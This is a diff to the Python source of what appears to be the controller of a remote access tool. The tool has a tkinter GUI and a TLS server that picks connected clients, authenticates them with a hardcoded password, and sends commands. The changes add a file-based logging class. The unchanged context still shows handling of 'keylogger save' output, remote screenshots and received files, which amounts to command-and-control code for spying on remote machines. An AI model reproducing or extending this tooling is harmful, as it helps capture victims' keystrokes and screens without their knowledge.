@@ -7,6 +7,7 @@ import os
 import mss.tools
 import ssl
 
+
 class App():
     def __init__(self, port, max_clients, timeout):
         self.root = tk.Tk()
@@ -15,6 +16,8 @@ class App():
 
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         self.context.load_cert_chain(certfile="ressources/ssl/cert.pem", keyfile="ressources/ssl/key.pem")
+
+        self.log = Log()
 
         self.password = "Id6-DIjjf032_ddo"
         self.port = 5203
@@ -48,8 +51,8 @@ class App():
         self.menu_bar.add_cascade(label="Terminal", menu=self.terminalmenu)
 
         self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
-        self.logsmenu.add_command(label="Open Logs")
-        self.logsmenu.add_command(label="Reset Logs")
+        self.logsmenu.add_command(label="Open Logs", command=self.log.open_)
+        self.logsmenu.add_command(label="Reset Logs", command=self.log.clear)
         self.menu_bar.add_cascade(label="Logs", menu=self.logsmenu)
 
         self.root.config(menu=self.menu_bar)
@@ -61,6 +64,7 @@ class App():
         
     def close_conn(self):
         try:
+            self.log.add("connection and client closed")
             self.client.close()
             self.socket.close()
         except:
@@ -68,6 +72,7 @@ class App():
 
     def conn_manager(self):
         def search():
+            self.log.add("new connection ?")
             conn_manager_ = ConnMaker()
             self.selected_client = conn_manager_.selected_client
             if self.selected_client != ["", ""]:
@@ -88,7 +93,6 @@ class App():
                             ssock = self.context.wrap_socket(client, server_side=True)
                             data = ssock.recv(1024).decode()
                             if client_addr[0] == self.selected_client[0]:
-                                print("client selected")
                                 ssock.send(b"SELECTED")
                                 time.sleep(0.05)
                                 password = ssock.recv(1024).decode()
@@ -98,13 +102,14 @@ class App():
                                     self.id = id_
                                     self.client = ssock
                                     self.client_addr = client_addr
+                                    self.log.add(f"connected to client : {self.selected_client}")
                                 return True
                             else:
                                 ssock.sendall(b"PINGED")
                                 ssock.close()
                             time.sleep(0.1)
                         except Exception as e:
-                            print(1, e)
+                            self.log.add(f"error while trying to select a client in conn_manager function : {e}")
         threading.Thread(target=search, daemon=True).start()
         
     def clear_terminal(self):
@@ -169,6 +174,7 @@ class CMD():
         self.root.after(600, self.blink_cursor)
 
     def execute_command(self, command):
+        app.log.add(f"new command : {command}")
         self.prevent_exit = True
         if not os.path.exists("ressources/received_files/"):
             os.makedirs("ressources/received_files/")
@@ -199,9 +205,10 @@ class CMD():
                         
                     except Exception as e:
                         self.text.insert(tk.END, "\nError !")
-                        print(3, e)
+                        app.log.add(f"error while sending file in execute_command function : {e}")
                         
                 header, data = comm(app.client, f"COMMAND:{len(data)}:NONE", data)
+                app.log.add(f"received header : {header}")
                 header = header.split(":")
                 
                 if command == "keylogger save":
@@ -223,9 +230,10 @@ class CMD():
                     mss.tools.to_png(data.rgb, data.size, output=name)
                     
                 else:
-                    print("mismatched type")
+                    app.log.add("mismatched type in header")
                     
                 if header[2] == "CLOSE":
+                    app.log.add("socket and client closed by cmd")
                     app.client.close()
                     app.socket.close()
 
@@ -297,7 +305,7 @@ class ConnMaker():
                     time.sleep(0.1)
                     ssock.close()
                 except Exception as e:
-                    print(3, e)
+                    app.log.add(f"error while trying to connect to a potential client : {e}")
                     
             try:
                 for i, j in enumerate(self.clients):
@@ -307,6 +315,31 @@ class ConnMaker():
             return True
         
         threading.Thread(target=search, daemon=True).start()
+        
+        
+class Log():
+    def __init__(self):
+        self.name = f"{time.time()}.txt"
+        self.path = f"ressources/logs/{self.name}"
+        if not os.path.exists("ressources/logs/"):
+            os.makedirs("ressources/logs/")
+        with open(self.path, "w") as f:
+            f.write(f"log created at time : {self.name[0:-4]}")
+            
+    def add(self, log):
+        try:
+            with open(self.path, "a") as f:
+                f.write(f"\n{time.time()}>{log}")
+        except Exception as e:
+            print("log : ", e)
+    
+    def clear(self):
+        with open(self.path, "w") as f:
+            f.write("")
+            
+    def open_(self):
+        path = os.path.join(os.getcwd(), self.path)
+        os.startfile(path)
 
 
 def comm(client, header, data):
@@ -325,7 +358,7 @@ def comm(client, header, data):
         
         return header, data
     except Exception as e:
-        print(0, e)
+        app.log.add(f"error in comm function : {e}")
         return "ERROR:ERROR:ERROR", f"error while receiving data: {e}"
     
 
